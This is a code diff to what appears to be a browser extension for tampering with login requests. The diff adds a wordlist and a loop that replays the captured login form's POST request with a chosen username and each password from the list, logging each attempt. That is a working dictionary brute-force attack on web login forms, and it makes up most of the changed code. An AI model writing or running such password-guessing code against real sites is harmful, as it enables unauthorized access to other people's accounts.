@@ -4,11 +4,11 @@ var types = [];
 var pattern = false;
 var failpattern;
 var crackuser;
+var wordlist;
 var msgHandler = ()=>{};
 function handleMessage(msg){
 	msgHandler(msg);
 }
-
 
 
 
@@ -68,15 +68,14 @@ console.log("Other param: " + body.name);
 }
 });
 console.log(e.originUrl);
+var wordbyline = wordlist.split("\n");
+for(var iter = 0; iter < wordbyline.length; iter++) {
 var xhr = new XMLHttpRequest();
 xhr.open("POST", e.originUrl, true);
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-xhr.send(un_f + "=" + crackuser + "&" + pw_f + "=abc");
-//console.log("Response: ");
+xhr.send(un_f + "=" + crackuser + "&" + pw_f + "=" + wordbyline[iter]);
 xhr.onload = function() {
 var databack = this.responseText;
-//var data = JSON.parse(this.responseText);
-//console.log(data);
 if (databack.length < 5) {
  console.log("Error short page.");
 }
@@ -88,8 +87,11 @@ console.log("Broke");
 }
 }
 
-});
 
+console.log("Trying: " + wordbyline[iter]);
+
+}
+});
 }
 
 function stop_tamper_listener(){
@@ -114,7 +116,7 @@ function start_tamper_listener(){
 }
 
 function user_confirm_tamper(){
-	return new Promise(done=>{
+return new Promise(done=>{
 		browser.windows.create({
 			url: "popup.html",
 			type: "panel",
@@ -125,6 +127,7 @@ function user_confirm_tamper(){
 				pattern = msg.docpattern;
                                 failpattern = msg.failpattern;
                                 crackuser = msg.crackuser;
+                                wordlist = msg.wordlist;
 				browser.windows.getCurrent().then(wi=>{
 					browser.windows.remove(wi.id);
 					done(msg);
